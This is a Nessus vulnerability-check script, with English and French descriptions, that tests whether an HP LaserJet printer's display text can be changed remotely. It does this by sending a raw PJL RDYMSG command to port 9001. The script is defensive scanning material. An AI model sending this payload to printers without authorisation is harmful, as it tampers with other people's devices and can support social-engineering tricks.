#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10103);
 script_bugtraq_id(2245);
 script_version ("$Revision: 1.14 $");
 
 name["english"] = "HP LaserJet display hack";
 name["francais"] = "HP LaserJet display hack";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It may be possible to
remotely change the printer's display
text. Please check the printer display,
and if it is set to 'Nessus' then the
test succeeded.

This attack can be used in addition
to social engineering tricks, so you
should fix this problem.

Solution : filter incoming packets to port 9001.

Risk factor : Low";

 desc["francais"] = "Il est peut-être possible de
changer à distance le texte affiché sur
l'écran LCD de l'imprimante. Vérifiez 
l'écran LCD, et si vous lisez 'Nessus',
alors le problème existe.

Cette attaque peut etre utilisée 
conjointement avec du social
engineering, donc vous devriez
fixer ce problème.

Solution : filtrez le traffic entrant en direction du port 9001.

Facteur de risque : Faible";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Changes the printer's display";
 summary["francais"] = "Change l'affichage de l'imprimante";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Misc.";
 family["francais"] = "Divers";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "passwordless_hp_printer.nasl");
 script_require_keys("devices/hp_printer");
 script_require_ports(9001);
 exit(0);
}

#
# The script code starts here
#

hp = get_kb_item("devices/hp_printer");
if(hp)
{
 port = 9001;
 if(get_port_state(port))
 {
  soc = open_sock_tcp(port);
  if(soc)
  {
   data = raw_string("\033#-12345X@PJL RDYMSG DISPLAY = ",0x22,
   		     "Nessus", 0x22, "\033#-12345X\r\n");
   send(socket:soc, data:data);
   security_warning(9001);
   close(soc);
   }
  }		
}
